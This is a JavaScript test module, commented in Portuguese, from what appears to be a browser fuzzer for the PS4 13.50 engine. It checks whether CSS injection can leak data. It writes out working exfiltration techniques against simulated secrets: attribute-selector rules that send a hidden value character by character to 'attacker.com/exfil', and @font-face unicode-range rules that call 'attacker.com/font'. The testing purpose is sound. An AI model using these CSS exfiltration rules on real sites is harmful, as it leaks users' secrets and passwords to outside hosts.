/**
 * TEST: CSS Injection / Data Exfiltration
 * Tenta exfiltrar dados via CSS selectors e timing
 * PS4 13.50: CSS engine completo
 */

export const testCssInjection = {
    id: 'CSS_INJECTION',
    name: 'CSS Injection Data Exfil',
    risk: 'LOW',
    category: 'DOM',
    description: 'Tenta exfiltrar dados via CSS selectors e propriedades customizadas',
    ps4Compatible: true,
    
    setup: function() {
        this.testDiv = document.createElement('div');
        this.testDiv.id = 'fuzzer-css-test';
        this.testDiv.setAttribute('data-secret', 'hidden_value_12345');
        this.testDiv.textContent = 'Secret Content';
        this.testDiv.style.display = 'none';
        document.body.appendChild(this.testDiv);
        
        // Cria input com valor sensível simulado
        this.secretInput = document.createElement('input');
        this.secretInput.type = 'password';
        this.secretInput.id = 'fuzzer-css-input';
        this.secretInput.value = 'simulated_password';
        this.secretInput.style.display = 'none';
        document.body.appendChild(this.secretInput);
        
        // Cria stylesheet dinâmica
        this.styleEl = document.createElement('style');
        this.styleEl.id = 'fuzzer-css-style';
        document.head.appendChild(this.styleEl);
        
        this.exfiltratedData = [];
        this.cssProperties = [];
    },
    
    probe: [
        // Probe 0: CSSStyleSheet injetada?
        function(scenario) {
            return scenario.styleEl?.sheet?.cssRules?.length ?? 0;
        },
        
        // Probe 1: Elemento com data-secret ainda existe?
        function(scenario) {
            return document.getElementById('fuzzer-css-test')?.getAttribute('data-secret') ?? 'MISSING';
        },
        
        // Probe 2: Input value acessível via CSS?
        function(scenario) {
            try {
                const input = document.getElementById('fuzzer-css-input');
                if (!input) return 'MISSING';
                
                // Verifica se :placeholder-shown ou :valid podem expor estado
                const style = window.getComputedStyle(input);
                return `color=${style.color}, bg=${style.backgroundColor}`;
            } catch (e) {
                return 'STYLE_ERROR';
            }
        },
        
        // Probe 3: Custom properties vazadas?
        function(scenario) {
            return scenario.cssProperties.length;
        }
    ],
    
    trigger: function() {
        // Ataque 1: CSS attribute selector para exfiltrar data-secret caractere por caractere
        const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_';
        let leakedValue = '';
        
        for (let pos = 0; pos < 20; pos++) {
            let found = false;
            
            for (const char of charset) {
                const cssRule = `
                    #fuzzer-css-test[data-secret^="${leakedValue}${char}"] {
                        background: url('https://attacker.com/exfil?data=${leakedValue}${char}');
                    }
                `;
                
                try {
                    this.styleEl.sheet?.insertRule(cssRule, this.styleEl.sheet.cssRules.length);
                } catch (e) {
                    // Regra inválida ou limite atingido
                }
                
                // Verifica se elemento foi estilizado (match)
                try {
                    const bg = window.getComputedStyle(this.testDiv).backgroundImage;
                    if (bg && bg.includes('url') && bg !== 'none') {
                        leakedValue += char;
                        found = true;
                        break;
                    }
                } catch (e) {}
            }
            
            if (!found) break;
        }
        
        if (leakedValue.length > 0) {
            this.exfiltratedData.push({ method: 'attribute_selector', data: leakedValue });
        }
        
        // Ataque 2: @font-face com unicode-range para exfiltrar texto
        const fontsToTest = [
            { char: 'S', font: 'url("https://attacker.com/font?char=S")' },
            { char: 'e', font: 'url("https://attacker.com/font?char=e")' },
            { char: 'c', font: 'url("https://attacker.com/font?char=c")' },
        ];
        
        for (const { char, font } of fontsToTest) {
            try {
                const fontRule = `
                    @font-face {
                        font-family: 'exfil-${char}';
                        src: ${font};
                        unicode-range: U+${char.charCodeAt(0).toString(16).toUpperCase()};
                    }
                `;
                this.styleEl.sheet?.insertRule(fontRule, 0);
            } catch (e) {}
        }
        
        // Ataque 3: CSS custom properties para detectar estados
        try {
            const rootStyle = document.documentElement.style;
            
            // Tenta injetar custom property que pode vazar informação
            const customProps = [
                '--fuzzer-test-1',
                '--fuzzer-test-2',
                '--fuzzer-test-3'
            ];
            
            for (const prop of customProps) {
                rootStyle.setProperty(prop, 'test_value_' + Math.random().toString(36));
                const computed = window.getComputedStyle(document.documentElement);
                const value = computed.getPropertyValue(prop);
                
                if (value) {
                    this.cssProperties.push({ prop, value });
                }
                
                rootStyle.removeProperty(prop);
            }
        } catch (e) {
            this.cssPropertiesError = e.message;
        }
    },
    
    cleanup: function() {
        this.testDiv?.remove();
        this.secretInput?.remove();
        this.styleEl?.remove();
        this.testDiv = null;
        this.secretInput = null;
        this.styleEl = null;
        this.exfiltratedData = null;
        this.cssProperties = null;
    },
    
    customValidator: function(baseResults, afterResults) {
        // Verifica se dados foram exfiltrados via CSS selectors
        if (this.exfiltratedData && this.exfiltratedData.length > 0) {
            return {
                anomaly: true,
                reason: `💥 CSS EXFIL: Dados exfiltrados via CSS: ${JSON.stringify(this.exfiltratedData)}`
            };
        }
        
        // Verifica se custom properties vazaram informação
        if (this.cssProperties && this.cssProperties.length > 0) {
            return {
                anomaly: true,
                reason: `🏆 CSS CUSTOM PROPERTIES: ${this.cssProperties.length} propriedades injetadas e lidas`
            };
        }
        
        return { anomaly: false, reason: '' };
    }
};
